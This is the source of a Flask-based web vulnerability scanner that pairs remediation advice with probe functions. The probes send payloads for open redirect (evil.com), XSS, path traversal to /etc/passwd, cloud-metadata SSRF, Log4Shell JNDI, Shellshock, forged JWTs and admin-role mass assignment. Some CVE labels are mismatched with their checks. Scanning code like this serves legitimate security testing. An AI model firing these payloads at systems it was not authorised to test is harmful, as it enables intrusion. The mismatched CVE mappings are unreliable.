from flask import Flask, render_template, request, jsonify, send_file
import requests
import ssl
import socket
import re
import csv
import io
import time
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

HEADERS = {"User-Agent": "VulnScanner/1.0 (Authorized Security Testing Tool)"}
TIMEOUT = 10

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════
# FIXES DATABASE — remediation advice for every check
# ══════════════════════════════════════════════════════════
FIXES = {
    "Security Headers": "Add missing headers in your web server config. For Nginx: add_header Strict-Transport-Security, X-Frame-Options DENY, X-Content-Type-Options nosniff, Content-Security-Policy, Referrer-Policy. Remove X-Powered-By and Server headers.",
    "SSL/TLS Configuration": "Upgrade to TLS 1.2+ only. Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. Renew expiring certificates. Use tools like ssl-config.mozilla.org to generate safe configs.",
    "Open Redirect": "Validate and whitelist all redirect destinations server-side. Never use user-supplied input directly in redirect headers. Use a mapping of safe redirect keys instead.",
    "SQL Injection": "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Use an ORM. Apply least-privilege DB accounts. Enable WAF rules for SQLi.",
    "Cross-Site Scripting (XSS)": "HTML-encode all user output. Implement a strict Content-Security-Policy. Use modern frameworks that auto-escape output. Validate and sanitize all input server-side.",
    "Directory Listing": "Disable directory listing in your web server (Nginx: autoindex off; Apache: Options -Indexes). Ensure no sensitive directories are web-accessible.",
    "Sensitive File Exposure": "Block access to .env, .git, config files via web server rules. Move secrets outside the webroot. Use .gitignore to prevent committing secrets. Rotate any exposed credentials immediately.",
    "CORS Misconfiguration": "Never use wildcard (*) CORS with credentials. Whitelist specific trusted origins. Validate the Origin header server-side. Set Access-Control-Allow-Credentials: true only when necessary.",
    "HTTP Methods": "Disable TRACE, PUT, DELETE in your web server unless explicitly needed. Apache: LimitExcept GET POST. Nginx: limit_except GET POST { deny all; }",
    "Clickjacking": "Set X-Frame-Options: DENY or SAMEORIGIN. Add frame-ancestors directive to your CSP. Test with browser dev tools.",
    "Rate Limiting": "Implement rate limiting on all endpoints (especially auth). Use tools like nginx limit_req, Flask-Limiter, or API gateway rate limiting. Return 429 Too Many Requests.",
    "Information Disclosure": "Disable debug mode in production. Configure custom error pages. Suppress stack traces. Set appropriate log levels. Never expose framework/version info.",
    "Exposed Admin Panels": "Move admin interfaces to non-standard paths or separate internal networks. Require VPN/IP allowlisting. Add MFA. Return 404 instead of 401/403 to avoid confirming existence.",
    "Cookie Security": "Set Secure, HttpOnly, and SameSite=Strict flags on all cookies. Use __Host- prefix for sensitive cookies. Avoid storing sensitive data in cookies.",
    "Log4Shell (CVE-2021-44228)": "Upgrade Log4j to 2.17.1+. If upgrade not possible, set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath. Apply vendor patches immediately.",
    "Spring4Shell (CVE-2022-22965)": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Use JDK 9+. Apply Spring Boot patches. Disable data binding on sensitive classes.",
    "Path Traversal": "Validate and sanitize all file path inputs. Use a whitelist of allowed paths. Resolve canonical paths and verify they start with the expected base directory. Never pass raw user input to file APIs.",
    "Server-Side Request Forgery (SSRF)": "Validate and whitelist allowed URLs/IPs for outbound requests. Block access to metadata endpoints (169.254.169.254). Use allowlists not blocklists. Disable unnecessary URL fetch functionality.",
    "Shellshock (CVE-2014-6271)": "Update bash to a patched version (4.3 patch 25+). Replace CGI scripts using bash. Audit all scripts executed via web server. Apply OS vendor patches.",
    "HSTS Implementation": "Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Submit your domain to the HSTS preload list at hstspreload.org.",
    "GraphQL Introspection": "Disable introspection in production GraphQL APIs. Use graphql-disable-introspection middleware. Implement query depth limiting and query cost analysis.",
    "GraphQL Depth Attack": "Implement query depth limiting (max 5-7 levels). Use graphql-depth-limit library. Apply query complexity analysis to prevent DoS.",
    "REST API Versioning Exposure": "Remove version info from headers. Use URL versioning (/v1/) instead of headers. Deprecate and remove old API versions promptly.",
    "JWT None Algorithm": "Explicitly reject 'none' algorithm in JWT validation. Use a strict allowlist of accepted algorithms (RS256, ES256). Use a well-maintained JWT library.",
    "JWT Weak Secret": "Use cryptographically random secrets of 256+ bits for HMAC. Prefer asymmetric algorithms (RS256, ES256) for JWT signing. Rotate secrets regularly.",
    "API Key in URL": "Never pass API keys in URL query parameters — use Authorization headers. Rotate any exposed API keys immediately. Implement API key scanning in CI/CD.",
    "Broken Object Level Authorization": "Validate that the authenticated user owns/has access to every requested object. Use indirect references. Log and alert on authorization failures.",
    "Mass Assignment": "Use explicit allowlists (not blocklists) for accepted fields. Never bind raw request body directly to model objects. Use DTOs/schema validation.",
    "API Rate Limiting": "Implement per-user and per-IP rate limits on all API endpoints. Return 429 with Retry-After header. Use token bucket or sliding window algorithms.",
    "Swagger/OpenAPI Exposure": "Password-protect or remove API documentation in production. Use network-level controls to restrict access. Ensure docs don't expose internal endpoints.",
    "HTTP Parameter Pollution": "Parse parameters consistently and use only the first/last occurrence. Validate all parameters server-side. Use strict schema validation.",
    "Host Header Injection": "Validate the Host header against a whitelist of allowed values. Configure your web server to reject unexpected Host headers. Don't use Host header in password reset links.",
    "Insecure Deserialization": "Never deserialize untrusted data. Use safe formats like JSON. Implement integrity checks. Apply deserialization filters. Update frameworks with known deserialization CVEs.",
    "XML External Entity (XXE)": "Disable external entity processing in XML parsers. Use DISALLOW_DOCTYPE_DECL feature. Switch to JSON where possible. Update XML libraries.",
    "Server-Side Template Injection": "Never render user input directly in templates. Use sandboxed template engines. Validate and escape all user input. Use logic-less templates where possible.",
    "LDAP Injection": "Use parameterized LDAP queries. Escape special characters in LDAP filters. Validate and sanitize all user input used in LDAP queries.",
    "Command Injection": "Never pass user input to shell commands. Use language APIs instead of shell exec. If shell is needed, use strict allowlists and escape all inputs.",
    "Insecure File Upload": "Validate file type by content (magic bytes), not extension. Store uploads outside webroot. Rename uploaded files. Scan for malware. Limit file size.",
    "Prototype Pollution": "Use Object.create(null) for maps. Validate JSON input against schema. Use safe merge libraries. Freeze Object.prototype in Node.js apps.",
    "ReDoS": "Test regex patterns against ReDoS payloads. Use linear-time regex engines. Set timeouts on regex operations. Use simple, non-backtracking patterns.",
    "Dependency Confusion": "Use scoped package names. Configure npm/pip to only use internal registries for internal packages. Verify package checksums.",
    "CVE-2021-26855 (ProxyLogon)": "Apply Microsoft Exchange patches immediately. Use Microsoft's one-click mitigation tool. Check for indicators of compromise. Enable Extended Protection for Authentication.",
    "CVE-2021-34527 (PrintNightmare)": "Apply Windows patches (KB5004945+). Disable Print Spooler on non-printing servers. Restrict print driver installation to admins only.",
    "CVE-2022-1388 (F5 BIG-IP)": "Upgrade F5 BIG-IP to patched versions. Restrict iControl REST access to trusted networks. Block external access to management interface.",
    "CVE-2023-44487 (HTTP/2 Rapid Reset)": "Update HTTP/2 server implementations. Apply vendor patches. Configure max concurrent streams limits. Use DDoS mitigation services.",
    "CVE-2021-21985 (VMware vCenter)": "Update vCenter to patched versions. Restrict access to vCenter management interface. Disable the vSAN Health Check plugin if not needed.",
    "Insecure Direct Object Reference": "Use indirect references or GUIDs. Always verify the authenticated user has permission to access the requested resource server-side.",
    "Security Misconfiguration": "Implement a hardening checklist. Remove default credentials and unused features. Keep all software updated. Use security benchmarks (CIS).",
    "Verbose Server Errors": "Configure custom error pages. Disable detailed error messages in production. Log errors server-side only. Use generic error messages for users.",
    "Unvalidated Input": "Implement strict input validation on all endpoints. Use allowlists for acceptable input. Reject unexpected input rather than sanitizing.",
    "Session Fixation": "Generate a new session ID on every login. Invalidate old sessions. Set session expiry. Use secure, HttpOnly, SameSite cookies.",
    "Weak Password Policy": "Enforce minimum password length (12+). Require complexity. Implement MFA. Check against known breached password lists (HaveIBeenPwned API).",
    "Account Enumeration": "Return identical responses for valid and invalid usernames. Use generic error messages ('Invalid credentials'). Implement rate limiting on auth endpoints.",
    "Insecure Password Reset": "Use time-limited, single-use reset tokens. Send tokens via email only. Invalidate old tokens on use. Don't expose reset tokens in URLs.",
    "Missing Function Level Access Control": "Enforce authorization checks on every function, not just UI visibility. Test all endpoints with different privilege levels. Use role-based access control.",
    "CRLF Injection": "Validate and strip CR (\\r) and LF (\\n) characters from user input used in headers. Use safe header-setting APIs.",
    "Business Logic Flaws": "Implement server-side validation of all business rules. Test negative flows and edge cases. Use state machines for multi-step processes.",
    "Insufficient Logging": "Log all authentication events, access control failures, and input validation failures. Include timestamps, user IDs, and IP addresses. Alert on suspicious patterns.",
    "GraphQL Mutation Abuse": "Require authentication for all mutations. Implement rate limiting on mutations. Validate all mutation inputs. Log all mutation operations.",
    "WebSocket Security": "Validate the Origin header on WebSocket handshake. Authenticate WebSocket connections. Implement message validation and rate limiting.",
    "Content Type Sniffing": "Set X-Content-Type-Options: nosniff. Serve files with correct Content-Type headers. Don't allow user-controlled content types.",
    "Subresource Integrity Missing": "Add integrity attributes to all external script and style tags. Use SRI hash generation tools. Host critical resources locally.",
    "Cache Poisoning": "Validate all inputs that affect caching. Set Vary headers correctly. Use Cache-Control: no-store for sensitive responses. Audit CDN caching rules.",
    "HTTP Request Smuggling": "Normalize HTTP request parsing between frontend and backend. Use HTTP/2 end-to-end. Disable backend connection reuse. Apply vendor patches.",
    "DNS Rebinding": "Validate Host headers server-side. Bind services to specific IP addresses. Use DNS pinning. Implement proper CORS policies.",
    "CVE-2019-0708 (BlueKeep)": "Apply Windows patches. Disable RDP if not needed. Enable Network Level Authentication. Use a VPN for RDP access.",
    "API Endpoint Enumeration": "Return 404 for all non-existent endpoints (not 401/403). Remove API documentation from production. Implement endpoint allowlisting.",
    "OAuth Misconfiguration": "Validate redirect_uri against a strict whitelist. Use state parameter to prevent CSRF. Implement PKCE for public clients. Audit OAuth scopes.",
    "SAML Vulnerabilities": "Use a well-maintained SAML library. Validate XML signatures strictly. Disable XML signature wrapping. Keep SAML libraries updated.",
    "IDOR in APIs": "Validate object ownership on every API request. Use UUIDs instead of sequential IDs. Implement proper authorization middleware.",
    "Insufficient Transport Security": "Enforce HTTPS everywhere. Use HSTS with preload. Disable HTTP entirely or redirect to HTTPS. Use certificate pinning for mobile apps.",
    "Exposed Debug Endpoints": "Remove or disable all debug endpoints in production (/debug, /trace, /actuator, /_debug). Use environment-based feature flags.",
    "Server Timing Information Leak": "Remove or restrict the Server-Timing header. Don't expose performance metrics publicly. Aggregate timing data before exposing.",
    "Feature Policy Misconfiguration": "Implement a Permissions-Policy header restricting camera, microphone, geolocation, etc. to only what's needed. Review and tighten policies regularly.",
}

def get_fix(name):
    return FIXES.get(name, "Review OWASP guidelines for this vulnerability type. Apply vendor patches, harden configuration, and follow security best practices.")

# ══════════════════════════════════════════════════════════
# ORIGINAL 20 CHECKS
# ══════════════════════════════════════════════════════════

def check_security_headers(url, session):
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        issues = []
        required = {
            "strict-transport-security": "Missing HSTS header",
            "x-content-type-options": "Missing X-Content-Type-Options (MIME sniffing risk)",
            "x-frame-options": "Missing X-Frame-Options (Clickjacking risk)",
            "content-security-policy": "Missing Content-Security-Policy",
            "referrer-policy": "Missing Referrer-Policy",
            "permissions-policy": "Missing Permissions-Policy",
        }
        for header, msg in required.items():
            if header not in headers:
                issues.append(msg)
        if "x-powered-by" in headers:
            issues.append(f"X-Powered-By exposes technology: {headers['x-powered-by']}")
        if "server" in headers:
            issues.append(f"Server header leaks info: {headers['server']}")
        return {"name": "Security Headers", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-693"}
    except Exception as e:
        return {"name": "Security Headers", "status": "ERROR", "severity": "MEDIUM", "issues": [str(e)], "cve": "CWE-693"}

def check_ssl_tls(url, session):
    issues = []
    try:
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if parsed.scheme != "https":
            return {"name": "SSL/TLS Configuration", "status": "FAIL", "severity": "HIGH", "issues": ["Site does not use HTTPS — all traffic is unencrypted"], "cve": "CVE-2014-3566"}
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((host, port), timeout=TIMEOUT), server_hostname=host) as s:
            cert = s.getpeercert()
            proto = s.version()
        if proto in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1"):
            issues.append(f"Outdated protocol: {proto}")
        expire_str = cert.get("notAfter", "")
        if expire_str:
            expire_dt = datetime.strptime(expire_str, "%b %d %H:%M:%S %Y %Z")
            days_left = (expire_dt - datetime.utcnow()).days
            if days_left < 30:
                issues.append(f"Certificate expires in {days_left} days")
        return {"name": "SSL/TLS Configuration", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CVE-2014-3566, CVE-2011-3389"}
    except ssl.SSLError as e:
        return {"name": "SSL/TLS Configuration", "status": "FAIL", "severity": "HIGH", "issues": [f"SSL error: {e}"], "cve": "CVE-2014-3566"}
    except Exception as e:
        return {"name": "SSL/TLS Configuration", "status": "ERROR", "severity": "HIGH", "issues": [str(e)], "cve": "CVE-2014-3566"}

def check_open_redirect(url, session):
    payloads = ["//evil.com", "https://evil.com", "//evil.com/%2F.."]
    issues = []
    for payload in payloads:
        test_url = f"{url}?redirect={payload}&next={payload}&url={payload}&return={payload}"
        try:
            r = session.get(test_url, timeout=TIMEOUT, allow_redirects=False, verify=False)
            if r.status_code in (301, 302, 303, 307, 308) and "evil.com" in r.headers.get("location", ""):
                issues.append(f"Open redirect via '{payload}'")
        except: pass
    return {"name": "Open Redirect", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-601"}

def check_sql_injection(url, session):
    payloads = ["'", "\""]
    error_patterns = [r"sql syntax", r"mysql_fetch", r"ORA-\d{5}", r"sqlite_", r"pg_query", r"syntax error", r"unclosed quotation"]
    issues = []
    for payload in payloads:
        try:
            r = session.get(f"{url}?id={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
            for pattern in error_patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    issues.append(f"SQL error leaked with payload: {payload}")
                    break
        except: pass
    return {"name": "SQL Injection", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2017-5638, CWE-89"}

def check_xss(url, session):
    payload = "<script>alert('xss')</script>"
    issues = []
    try:
        r = session.get(f"{url}?q={urllib.parse.quote(payload)}&search={urllib.parse.quote(payload)}", timeout=TIMEOUT, verify=False)
        if payload.lower() in r.text.lower():
            issues.append("Reflected XSS payload returned unescaped")
    except: pass
    return {"name": "Cross-Site Scripting (XSS)", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-79"}

def check_directory_listing(url, session):
    paths = ["/uploads/", "/files/", "/backup/", "/logs/", "/static/", "/assets/", "/images/"]
    issues = []
    for path in paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and ("index of" in r.text.lower() or "parent directory" in r.text.lower()):
                issues.append(f"Directory listing at: {path}")
        except: pass
    return {"name": "Directory Listing", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-548"}

def check_sensitive_files(url, session):
    sensitive = ["/.env", "/.git/config", "/config.php", "/wp-config.php", "/config.yml",
                 "/config.yaml", "/.htaccess", "/web.config", "/phpinfo.php", "/server-status",
                 "/backup.zip", "/database.sql", "/.DS_Store", "/robots.txt"]
    issues = []
    for path in sensitive:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and len(r.content) > 0:
                issues.append(f"Sensitive file accessible: {path}")
        except: pass
    return {"name": "Sensitive File Exposure", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CVE-2017-9798, CWE-538"}

def check_cors(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False, headers={**HEADERS, "Origin": "https://evil.com"})
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "*":
            issues.append("CORS wildcard (*) allows any origin")
        if acao == "https://evil.com":
            issues.append("CORS reflects arbitrary origin")
        if acac.lower() == "true" and acao in ("*", "https://evil.com"):
            issues.append("CORS allows credentials with permissive origin — HIGH RISK")
    except: pass
    return {"name": "CORS Misconfiguration", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-942"}

def check_http_methods(url, session):
    issues = []
    try:
        r = session.options(url, timeout=TIMEOUT, verify=False)
        allowed = r.headers.get("allow", r.headers.get("Allow", ""))
        for method in ["PUT", "DELETE", "TRACE", "CONNECT"]:
            if method in allowed:
                issues.append(f"Dangerous HTTP method enabled: {method}")
        r2 = session.request("TRACE", url, timeout=TIMEOUT, verify=False)
        if r2.status_code == 200 and "TRACE" in r2.text:
            issues.append("TRACE enabled — Cross-Site Tracing (XST) risk")
    except: pass
    return {"name": "HTTP Methods", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CVE-2004-2320, CWE-749"}

def check_clickjacking(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        xfo = headers.get("x-frame-options", "")
        csp = headers.get("content-security-policy", "")
        if not xfo and "frame-ancestors" not in csp:
            issues.append("No clickjacking protection")
        elif xfo.lower() not in ("deny", "sameorigin"):
            issues.append(f"Weak X-Frame-Options: '{xfo}'")
    except Exception as e:
        issues.append(str(e))
    return {"name": "Clickjacking", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-1021"}

def check_rate_limiting(url, session):
    issues = []
    try:
        responses = [session.get(url, timeout=TIMEOUT, verify=False).status_code for _ in range(15)]
        if not any(c in {429, 503} for c in responses):
            issues.append("No rate limiting after 15 rapid requests")
    except: pass
    return {"name": "Rate Limiting", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-307"}

def check_information_disclosure(url, session):
    patterns = [r"stack trace", r"at com\.", r"at java\.", r"Traceback \(most recent", r"DEBUG =", r"Exception in thread", r"NullPointerException"]
    issues = []
    for path in ["/%3Cscript%3E", "/nonexistent-xyz", "/?debug=true"]:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            for pattern in patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    issues.append(f"Stack trace/debug info exposed at: {path}")
                    break
        except: pass
    return {"name": "Information Disclosure", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-209"}

def check_admin_panels(url, session):
    admin_paths = ["/admin", "/admin/", "/administrator", "/wp-admin", "/wp-login.php",
                   "/login", "/dashboard", "/manage", "/panel", "/cpanel", "/phpmyadmin", "/adminer", "/console"]
    issues = []
    for path in admin_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False, allow_redirects=True)
            if r.status_code in (200, 401, 403):
                issues.append(f"Admin panel found (HTTP {r.status_code}): {path}")
        except: pass
    return {"name": "Exposed Admin Panels", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-284"}

def check_cookie_security(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        for cookie in r.cookies:
            flags = []
            if not cookie.secure: flags.append("missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"): flags.append("missing HttpOnly flag")
            if not cookie.get_nonstandard_attr("SameSite"): flags.append("missing SameSite")
            if flags:
                issues.append(f"Cookie '{cookie.name}': {', '.join(flags)}")
    except: pass
    return {"name": "Cookie Security", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-614, CWE-1004"}

def check_cve_log4shell(url, session):
    payload = "${jndi:ldap://log4shell-test.invalid/scan}"
    issues = []
    try:
        session.get(url, timeout=TIMEOUT, verify=False, headers={**HEADERS, "X-Api-Version": payload, "User-Agent": payload})
        issues.append("Log4Shell payload sent — manual OOB verification needed")
    except: pass
    return {"name": "Log4Shell (CVE-2021-44228)", "status": "WARN", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2021-44228"}

def check_spring4shell(url, session):
    issues = []
    try:
        r = session.get(f"{url}?class.module.classLoader.DefaultAssertionStatus=nosuchstatus",
                        headers={**HEADERS, "suffix": "%>//", "c1": "Runtime", "c2": "<%"},
                        timeout=TIMEOUT, verify=False)
        if r.status_code == 400:
            issues.append("Spring framework detected — may be vulnerable to Spring4Shell if unpatched")
    except: pass
    return {"name": "Spring4Shell (CVE-2022-22965)", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2022-22965"}

def check_path_traversal(url, session):
    payloads = ["../../etc/passwd", "..%2F..%2Fetc%2Fpasswd"]
    issues = []
    for payload in payloads:
        for param in ["file", "path", "page", "include", "doc"]:
            try:
                r = session.get(f"{url}?{param}={payload}", timeout=TIMEOUT, verify=False)
                if re.search(r"root:.*:0:0:", r.text) or "bin/bash" in r.text:
                    issues.append(f"Path traversal via '{param}' with '{payload}'")
            except: pass
    return {"name": "Path Traversal", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2021-41773, CWE-22"}

def check_ssrf(url, session):
    issues = []
    for payload in ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"]:
        for param in ["url", "src", "href", "dest", "redirect", "uri"]:
            try:
                r = session.get(f"{url}?{param}={urllib.parse.quote(payload)}", timeout=5, verify=False)
                if r.status_code == 200 and ("ami-id" in r.text or "instance-id" in r.text or "computeMetadata" in r.text):
                    issues.append(f"SSRF confirmed: cloud metadata via '{param}'")
            except: pass
    return {"name": "Server-Side Request Forgery (SSRF)", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2019-11510, CWE-918"}

def check_cve_shellshock(url, session):
    issues = []
    payload = "() { :;}; echo 'SHELLSHOCK'"
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False, headers={**HEADERS, "User-Agent": payload, "Referer": payload})
        if "SHELLSHOCK" in r.text:
            issues.append("Shellshock confirmed — bash executes commands via HTTP headers")
    except: pass
    return {"name": "Shellshock (CVE-2014-6271)", "status": "FAIL" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2014-6271"}

def check_hsts(url, session):
    issues = []
    try:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme == "http":
            issues.append("Site on HTTP — HSTS cannot be enforced")
        else:
            r = session.get(url, timeout=TIMEOUT, verify=False)
            hsts = r.headers.get("strict-transport-security", "")
            if not hsts:
                issues.append("HSTS header missing")
            else:
                m = re.search(r"max-age=(\d+)", hsts)
                if m and int(m.group(1)) < 31536000:
                    issues.append(f"HSTS max-age too short: {m.group(1)}s")
                if "includeSubDomains" not in hsts:
                    issues.append("HSTS does not include subdomains")
    except Exception as e:
        issues.append(str(e))
    return {"name": "HSTS Implementation", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-319"}

# ══════════════════════════════════════════════════════════
# NEW: API & MODERN APP CHECKS (80+)
# ══════════════════════════════════════════════════════════

def check_graphql_introspection(url, session):
    issues = []
    endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
    query = '{"query":"{__schema{types{name}}}"}'
    for ep in endpoints:
        try:
            r = session.post(urllib.parse.urljoin(url, ep), data=query,
                             headers={**HEADERS, "Content-Type": "application/json"}, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and "__schema" in r.text:
                issues.append(f"GraphQL introspection enabled at {ep} — full schema exposed")
        except: pass
    return {"name": "GraphQL Introspection", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-200"}

def check_graphql_depth(url, session):
    issues = []
    endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
    deep_query = '{"query":"{ a { b { c { d { e { f { g { h { i { j { name } } } } } } } } } } }"}'
    for ep in endpoints:
        try:
            r = session.post(urllib.parse.urljoin(url, ep), data=deep_query,
                             headers={**HEADERS, "Content-Type": "application/json"}, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and "errors" not in r.text.lower():
                issues.append(f"GraphQL accepts deeply nested queries at {ep} — DoS risk")
        except: pass
    return {"name": "GraphQL Depth Attack", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-400"}

def check_api_versioning(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}
        for h in ["x-api-version", "api-version", "x-version"]:
            if h in headers:
                issues.append(f"API version exposed in header: {h}: {headers[h]}")
    except: pass
    old_versions = ["/v0/", "/v1/", "/api/v1/", "/api/v0/"]
    for ver in old_versions:
        try:
            r = session.get(urllib.parse.urljoin(url, ver), timeout=TIMEOUT, verify=False)
            if r.status_code in (200, 401, 403):
                issues.append(f"Old API version accessible: {ver} (HTTP {r.status_code})")
        except: pass
    return {"name": "REST API Versioning Exposure", "status": "WARN" if issues else "PASS", "severity": "LOW", "issues": issues, "cve": "CWE-200"}

def check_jwt_none_alg(url, session):
    issues = []
    # JWT with alg:none — base64url encoded header.payload.
    fake_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "Authorization": f"Bearer {fake_jwt}"})
        if r.status_code in (200, 201) and r.status_code != 401:
            issues.append("Server may accept JWT with 'none' algorithm — authentication bypass risk")
    except: pass
    return {"name": "JWT None Algorithm", "status": "WARN" if issues else "PASS", "severity": "CRITICAL", "issues": issues, "cve": "CVE-2015-9235"}

def check_jwt_weak_secret(url, session):
    issues = []
    # JWT signed with weak secret 'secret'
    weak_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.XbPfbIHMI6arZ3Y9rnR6KkrrvdteU7ZIAEsQ_oc1sDs"
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False,
                        headers={**HEADERS, "Authorization": f"Bearer {weak_jwt}"})
        if r.status_code in (200, 201):
            issues.append("Server may accept JWT signed with weak secret 'secret'")
    except: pass
    return {"name": "JWT Weak Secret", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-326"}

def check_api_key_in_url(url, session):
    issues = []
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False)
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for key in params:
            if any(k in key.lower() for k in ["key", "token", "secret", "api_key", "apikey", "auth", "password", "passwd"]):
                issues.append(f"Sensitive parameter in URL: '{key}' — credentials may be logged")
        # Check response for API key patterns
        if re.search(r'(?:api[_-]?key|token|secret)\s*[:=]\s*["\']?[A-Za-z0-9_\-]{16,}', r.text, re.IGNORECASE):
            issues.append("Possible API key/token found in response body")
    except: pass
    return {"name": "API Key in URL", "status": "FAIL" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-598"}

def check_mass_assignment(url, session):
    issues = []
    payloads = [
        '{"role":"admin","isAdmin":true,"admin":true}',
        '{"privilege":"superuser","verified":true}'
    ]
    for ep in ["/api/user", "/api/account", "/api/profile", "/user", "/account"]:
        for payload in payloads[:1]:
            try:
                r = session.post(urllib.parse.urljoin(url, ep), data=payload,
                                 headers={**HEADERS, "Content-Type": "application/json"}, timeout=TIMEOUT, verify=False)
                if r.status_code in (200, 201) and any(x in r.text.lower() for x in ["admin", "role", "privilege"]):
                    issues.append(f"Possible mass assignment at {ep} — privileged fields accepted")
            except: pass
    return {"name": "Mass Assignment", "status": "WARN" if issues else "PASS", "severity": "HIGH", "issues": issues, "cve": "CWE-915"}

def check_api_rate_limiting(url, session):
    issues = []
    api_paths = ["/api/", "/api/v1/", "/graphql", "/api"]
    for path in api_paths:
        try:
            codes = [session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False).status_code for _ in range(20)]
            if not any(c in {429, 503} for c in codes):
                issues.append(f"No rate limiting on API endpoint: {path}")
                break
        except: pass
    return {"name": "API Rate Limiting", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-770"}

def check_swagger_exposure(url, session):
    swagger_paths = ["/swagger-ui.html", "/swagger-ui/", "/api-docs", "/swagger.json",
                     "/openapi.json", "/api/swagger", "/docs", "/redoc", "/v2/api-docs", "/v3/api-docs"]
    issues = []
    for path in swagger_paths:
        try:
            r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and any(x in r.text.lower() for x in ["swagger", "openapi", "paths", "definitions"]):
                issues.append(f"API documentation exposed at: {path}")
        except: pass
    return {"name": "Swagger/OpenAPI Exposure", "status": "FAIL" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-200"}

def check_http_parameter_pollution(url, session):
    issues = []
    try:
        r = session.get(f"{url}?id=1&id=2&role=user&role=admin", timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and "admin" in r.text.lower():
            issues.append("Possible HTTP Parameter Pollution — duplicate params may bypass validation")
    except: pass
    return {"name": "HTTP Parameter Pollution", "status": "WARN" if issues else "PASS", "severity": "MEDIUM", "issues": issues, "cve": "CWE-235"}

